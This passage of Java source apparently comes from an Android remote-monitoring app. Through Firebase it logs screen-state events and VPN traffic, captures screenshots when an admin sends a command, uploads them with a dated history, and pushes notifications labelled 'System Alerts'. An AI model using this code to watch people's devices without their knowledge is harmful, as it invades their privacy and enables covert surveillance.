        for (Map.Entry<String, List<Map<String, Object>>> entry : dateWise.entrySet()) {
            DatabaseReference ref = getDbRef(getPath("/userDeviceData/screenState/" + entry.getKey()));
            Map<String, Object> updates = new HashMap<>();
            for (Map<String, Object> event : entry.getValue()) {
                String key = ref.push().getKey();
                if (key != null) updates.put(key, event);
            }
            if (!updates.isEmpty()) ref.updateChildren(updates);
        }
    }

    public static void getRemoteScreenState() {
        getDbRef(getSelectedUserPath("/userDeviceData/screenState")).addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                com.vikasyadavnsit.cdc.utils.ActionUtils.displayRemoteScreenState(snapshot.getValue(Object.class));
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {
                LoggerUtils.e("FirebaseUtils", "getRemoteScreenState cancelled: " + error.getMessage());
            }
        });
    }

    public static void updateVpnConfig(com.vikasyadavnsit.cdc.data.VpnConfig config) {
        getDbRef(getSelectedUserPath("/appSettings/vpnConfig")).setValue(config);
    }

    public static void getVpnConfig(ValueEventListener listener) {
        getDbRef(getSelectedUserPath("/appSettings/vpnConfig")).addValueEventListener(listener);
    }

    public static void removeVpnConfigListener(ValueEventListener listener) {
        getDbRef(getSelectedUserPath("/appSettings/vpnConfig")).removeEventListener(listener);
    }

    public static void removeVpnTrafficListener(ValueEventListener listener) {
        getDbRef(getSelectedUserPath("/userDeviceData/vpnTraffic")).removeEventListener(listener);
    }

    private static final int MAX_VPN_TRAFFIC_LOGS = 50;

    public static void logVpnTraffic(Object entry) {
        DatabaseReference ref = getDbRef(getPath("/userDeviceData/vpnTraffic"));
        ref.push().setValue(entry);
        trimOldestEntries(ref, MAX_VPN_TRAFFIC_LOGS);
    }

    public static void clearVpnTraffic() {
        getDbRef(getSelectedUserPath("/userDeviceData/vpnTraffic")).removeValue();
    }

    /** Reads all keys under ref and deletes the oldest ones so at most maxEntries remain. */
    private static void trimOldestEntries(DatabaseReference ref, int maxEntries) {
        ref.orderByKey().addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                long excess = snapshot.getChildrenCount() - maxEntries;
                if (excess <= 0) return;
                for (DataSnapshot child : snapshot.getChildren()) {
                    if (excess-- <= 0) break;
                    child.getRef().removeValue();
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {
                LoggerUtils.e("FirebaseUtils", "trimOldestEntries cancelled: " + error.getMessage());
            }
        });
    }

    public static void getVpnTraffic(ValueEventListener listener) {
        getDbRef(getSelectedUserPath("/userDeviceData/vpnTraffic")).orderByKey().addValueEventListener(listener);
    }

    // ── Remote Screenshot ─────────────────────────────────────────────────────

    private static long lastScreenshotCommandTimestamp = 0;

    /** Device-side: listen for admin screenshot commands; fires the given Runnable when a fresh command arrives. */
    public static void listenForScreenshotCommand(Context context) {
        getDbRef(getPath(AppConstants.FIREBASE_RTDB_SCREENSHOT_COMMAND_PATH))
                .addValueEventListener(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                        if (!snapshot.exists()) return;
                        Long timestamp = snapshot.child("timestamp").getValue(Long.class);
                        if (timestamp != null && timestamp > lastScreenshotCommandTimestamp) {
                            lastScreenshotCommandTimestamp = timestamp;
                            // Only trigger if service is active — stale commands are ignored on cold start
                            if (com.vikasyadavnsit.cdc.services.ScreenshotService.isRunning()) {
                                LoggerUtils.d("FirebaseUtils", "Screenshot command received — triggering capture");
                                com.vikasyadavnsit.cdc.services.ScreenshotService.setTakeScreenshot(true);
                            }
                            // Remove command after consumption
                            snapshot.getRef().removeValue();
                        }
                    }
                    @Override public void onCancelled(@NonNull DatabaseError error) {
                        LoggerUtils.e("FirebaseUtils", "listenForScreenshotCommand cancelled: " + error.getMessage());
                    }
                });
    }

    /** Service-side: add a named listener so the service can remove it on destroy. Returns the listener for removal. */
    public static ValueEventListener addScreenshotCommandListener(Context context, Runnable onCommand) {
        ValueEventListener listener = new ValueEventListener() {
            private long serviceListenerTs = System.currentTimeMillis();

            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (!snapshot.exists()) return;
                Long timestamp = snapshot.child("timestamp").getValue(Long.class);
                if (timestamp != null && timestamp > serviceListenerTs) {
                    serviceListenerTs = timestamp;
                    onCommand.run();
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {
                LoggerUtils.e("FirebaseUtils", "addScreenshotCommandListener cancelled: " + error.getMessage());
            }
        };
        getDbRef(getPath(AppConstants.FIREBASE_RTDB_SCREENSHOT_COMMAND_PATH)).addValueEventListener(listener);
        return listener;
    }

    public static void removeScreenshotCommandListener(Context context, ValueEventListener listener) {
        getDbRef(getPath(AppConstants.FIREBASE_RTDB_SCREENSHOT_COMMAND_PATH)).removeEventListener(listener);
    }

    /** Device-side: upload screenshot as base64. Stores in a 'latest' node and a date-wise history. */
    public static void uploadScreenshotData(String base64Image, long timestamp) {
        Map<String, Object> data = new HashMap<>();
        data.put("imageBase64", base64Image);
        data.put("timestamp", timestamp);
        
        // 1. Overwrite 'latest' node for live viewer
        getDbRef(getPath(AppConstants.FIREBASE_RTDB_SCREENSHOT_PATH)).setValue(data)
                .addOnSuccessListener(unused -> LoggerUtils.i("FirebaseUtils", "Latest screenshot updated in RTDB"))
                .addOnFailureListener(e -> LoggerUtils.e("FirebaseUtils", "Latest screenshot update failed: " + e.getMessage()));

        // 2. Persist in date-wise history
        String date = new java.text.SimpleDateFormat("yyyy-MM-dd", java.util.Locale.getDefault()).format(new java.util.Date(timestamp));
        String time = new java.text.SimpleDateFormat("HH-mm-ss", java.util.Locale.getDefault()).format(new java.util.Date(timestamp));
        getDbRef(getPath("/userDeviceData/screenshotHistory/" + date + "/" + time)).setValue(data);
    }

    /** Admin-side: subscribe to live screenshot updates from the selected user. */
    public static void monitorRemoteScreenshot(ValueEventListener listener) {
        getDbRef(getSelectedUserPath(AppConstants.FIREBASE_RTDB_SCREENSHOT_PATH)).addValueEventListener(listener);
    }

    public static void removeRemoteScreenshotListener(ValueEventListener listener) {
        getDbRef(getSelectedUserPath(AppConstants.FIREBASE_RTDB_SCREENSHOT_PATH)).removeEventListener(listener);
    }

    /** Admin-side: delete the remote screenshot node (frees the fixed data space). */
    public static void deleteRemoteScreenshot() {
        getDbRef(getSelectedUserPath(AppConstants.FIREBASE_RTDB_SCREENSHOT_PATH)).removeValue();
    }

    /** Admin-side: write a capture command so the remote device takes a screenshot. */
    public static void requestRemoteScreenshot() {
        Map<String, Object> command = new HashMap<>();
        command.put("timestamp", System.currentTimeMillis());
        getDbRef(getSelectedUserPath(AppConstants.FIREBASE_RTDB_SCREENSHOT_COMMAND_PATH)).setValue(command);
    }

    public static void sendRemoteNotificationCommand(String title, String message) {
        Map<String, Object> command = new HashMap<>();
        command.put("title", title);
        command.put("message", message);
        command.put("timestamp", System.currentTimeMillis());
        getDbRef(getSelectedUserPath("/commands/showNotification")).setValue(command);
    }

    private static long lastNotificationCommandTimestamp = 0;

    public static void listenForNotificationCommand(Context context) {
        getDbRef(getPath("/commands/showNotification")).addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (!snapshot.exists()) return;
                Long timestamp = snapshot.child("timestamp").getValue(Long.class);
                if (timestamp != null && timestamp > lastNotificationCommandTimestamp) {
                    lastNotificationCommandTimestamp = timestamp;
                    String title = snapshot.child("title").getValue(String.class);
                    String message = snapshot.child("message").getValue(String.class);
                    showDeviceNotification(context, title, message);
                    // Clear the command after showing the notification to prevent repeated alerts on app restart
                    snapshot.getRef().removeValue();
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        });
    }

    private static void showDeviceNotification(Context context, String title, String message) {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            if (androidx.core.app.ActivityCompat.checkSelfPermission(context, android.Manifest.permission.POST_NOTIFICATIONS) 
                    != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                LoggerUtils.w("FirebaseUtils", "Missing POST_NOTIFICATIONS permission — cannot show alert");
                return;
            }
        }

        String channelId = "remote_alerts_channel";
        android.app.NotificationManager manager = (android.app.NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            android.app.NotificationChannel channel = new android.app.NotificationChannel(channelId, "System Alerts", android.app.NotificationManager.IMPORTANCE_HIGH);
            channel.setDescription("Critical system notifications and remote alerts");
            channel.enableLights(true);
            channel.setLightColor(android.graphics.Color.RED);
            channel.enableVibration(true);
            channel.setLockscreenVisibility(android.app.Notification.VISIBILITY_PUBLIC);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
        
        android.app.PendingIntent pendingIntent = android.app.PendingIntent.getActivity(context, 0, 
                new Intent(context, com.vikasyadavnsit.cdc.activities.MainActivity.class), 
                android.app.PendingIntent.FLAG_UPDATE_CURRENT | android.app.PendingIntent.FLAG_IMMUTABLE);

        androidx.core.app.NotificationCompat.Builder builder = new androidx.core.app.NotificationCompat.Builder(context, channelId)
                .setSmallIcon(com.vikasyadavnsit.cdc.R.drawable.ic_launcher_foreground)
                .setContentTitle(title != null && !title.isEmpty() ? title : "System Alert")
                .setContentText(message != null ? message : "")
                .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MAX)
                .setCategory(androidx.core.app.NotificationCompat.CATEGORY_ALARM)
                .setVisibility(androidx.core.app.NotificationCompat.VISIBILITY_PUBLIC)
                .setContentIntent(pendingIntent)
                .setAutoCancel(true);
                
        if (manager != null) {
            manager.notify((int) System.currentTimeMillis(), builder.build());
            LoggerUtils.i("FirebaseUtils", "Local alert notification posted successfully");
            
            // Acknowledge delivery to Firebase
            Map<String, Object> delivery = new HashMap<>();
            delivery.put("title", title);
            delivery.put("message", message);
            delivery.put("timestamp", System.currentTimeMillis());
            delivery.put("status", "DELIVERED");
            getDbRef(getPath("/userDeviceData/alertHistory")).push().setValue(delivery);
        }
    }
}
